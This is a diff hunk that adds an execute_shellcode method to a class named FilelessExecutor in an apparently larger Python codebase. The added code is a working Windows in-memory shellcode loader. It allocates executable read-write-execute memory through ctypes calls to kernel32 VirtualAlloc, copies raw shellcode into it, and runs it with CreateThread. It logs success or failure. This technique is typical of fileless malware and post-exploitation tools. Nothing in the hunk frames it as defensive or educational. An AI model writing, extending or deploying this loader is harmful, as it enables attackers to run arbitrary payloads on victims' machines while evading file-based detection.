@@ -3553,4 +3553,52 @@ class FilelessExecutor:
     def execute_shellcode(shellcode: bytes):
         """
         Executes raw shellcode in memory by allocating executable memory and
-        creating a thread to 
+        creating a thread to execute it.
+        """
+        try:
+            import ctypes
+            from ctypes import wintypes
+
+            kernel32 = ctypes.windll.kernel32
+
+            # Allocate executable memory
+            exec_mem = kernel32.VirtualAlloc(
+                None,
+                len(shellcode),
+                0x3000,  # MEM_COMMIT | MEM_RESERVE
+                0x40     # PAGE_EXECUTE_READWRITE
+            )
+
+            if not exec_mem:
+                logging.error("Failed to allocate executable memory")
+                return False
+
+            # Copy shellcode to executable memory
+            ctypes.memmove(exec_mem, shellcode, len(shellcode))
+
+            # Create thread to execute shellcode
+            thread_handle = kernel32.CreateThread(
+                None,
+                0,
+                exec_mem,
+                None,
+                0,
+                None
+            )
+
+            if not thread_handle:
+                kernel32.VirtualFree(exec_mem, 0, 0x8000)
+                logging.error("Failed to create thread for shellcode execution")
+                return False
+
+            # Wait for thread to complete
+            kernel32.WaitForSingleObject(thread_handle, 0xFFFFFFFF)
+            kernel32.CloseHandle(thread_handle)
+            kernel32.VirtualFree(exec_mem, 0, 0x8000)
+
+            logging.info("Shellcode executed successfully")
+            return True
+
+        except Exception as e:
+            logging.error(f"Shellcode execution failed: {e}")
+            return False 
